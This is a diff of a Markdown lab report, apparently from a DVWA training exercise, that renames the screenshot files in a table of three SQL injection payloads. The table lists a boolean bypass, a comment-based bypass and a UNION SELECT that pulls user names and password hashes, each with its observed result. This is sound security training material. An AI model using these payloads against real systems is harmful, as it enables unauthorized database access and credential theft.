@@ -12,9 +12,9 @@
 
 | No. | Payload Syntax | Objective | Observed Result | Screenshot Reference |
 | :--- | :--- | :--- | :--- | :--- |
-| **1** | `1' OR '1'='1` | Authentication / Logic Bypass | Closed the query string early and forced a true condition, dumping all user accounts and records from the database table. | `assets/step5_payload1_auth.png` |
-| **2** | `1' OR 1=1 #` | Query Commenting & Bypass | Leveraged the MySQL comment character (`#`) to bypass validation checks without throwing syntax errors. | `assets/step6_payload2_logic.png` |
-| **3** | `1' UNION SELECT user, password FROM users #` | Structural Data Extraction (UNION) | Merged the original query with a custom query to extract user names and cryptographic password hashes. | `assets/step7_payload3_union.png` |
+| **1** | `1' OR '1'='1` | Authentication / Logic Bypass | Closed the query string early and forced a true condition, dumping all user accounts and records from the database table. | `dvwatest1.jpg` |
+| **2** | `1' OR 1=1 #` | Query Commenting & Bypass | Leveraged the MySQL comment character (`#`) to bypass validation checks without throwing syntax errors. | `dvwatest2.jpg` |
+| **3** | `1' UNION SELECT user, password FROM users #` | Structural Data Extraction (UNION) | Merged the original query with a custom query to extract user names and cryptographic password hashes. | `dvwatest3.jpg` |
 
 ---
 
